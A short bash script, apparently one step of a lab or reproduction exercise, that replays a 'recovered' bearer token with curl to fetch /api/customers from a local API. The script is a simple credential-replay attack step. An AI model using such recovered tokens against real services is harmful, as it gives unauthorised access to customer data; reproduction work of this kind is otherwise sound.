#!/usr/bin/env bash
# EXP-03: Exploit the recovered token like the video's curl bearer auth.
# Usage: 03_api_auth_repro.sh <token> [api_base]
set -euo pipefail
TOKEN="${1:?usage: $0 <token> [api_base]}"
API="${2:-${API_URL:-http://localhost:8042}}"
echo "=== GET $API/api/customers with bearer ==="
curl -sS -w '\nHTTP %{http_code}\n' -H "Authorization: Bearer $TOKEN" "$API/api/customers"
